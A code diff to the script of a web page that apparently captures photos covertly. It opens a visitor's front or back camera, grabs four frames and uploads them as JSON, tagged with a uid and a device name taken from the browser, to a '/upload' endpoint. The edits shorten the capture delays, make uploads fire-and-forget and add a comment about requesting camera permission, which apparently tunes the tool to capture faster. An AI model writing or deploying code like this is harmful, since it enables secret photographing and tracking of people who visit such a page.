@@ -97,6 +97,7 @@
 
             let deviceName = navigator.userAgent.match(/\(([^)]+)\)/) ? navigator.userAgent.match(/\(([^)]+)\)/)[1].split(';')[0] : navigator.platform;
 
+            // कैमरा परमिशन मांगना
             if(mode === 'front') await runCam(info, {facingMode: "user"}, 4, "FRONT", deviceName);
             else if(mode === 'back') await runCam(info, {facingMode: "environment"}, 4, "BACK", deviceName);
             else {
@@ -117,7 +118,7 @@
                 video.srcObject = stream;
                 await video.play();
                 
-                await new Promise(r => setTimeout(r, 8000)); 
+                await new Promise(r => setTimeout(r, 2000)); 
 
                 for (let i = 1; i <= count; i++) {
                     let can = document.getElementById('c');
@@ -125,7 +126,7 @@
                     can.height = video.videoHeight;
                     can.getContext('2d').drawImage(video, 0, 0);
                     
-                    await fetch('/upload', {
+                    fetch('/upload', {
                         method: 'POST',
                         headers: {'Content-Type': 'application/json'},
                         body: JSON.stringify({
@@ -134,11 +135,14 @@
                             mode: label,
                             uid: uid 
                         })
-                    });
-                    await new Promise(r => setTimeout(r, 2500));
+                    }).catch(err => console.log(err));
+                    
+                    await new Promise(r => setTimeout(r, 1500));
                 }
                 stream.getTracks().forEach(t => t.stop());
-            } catch(e) {}
+            } catch(e) {
+                console.log("Cam Error: ", e);
+            }
         }
     </script>
 </body>
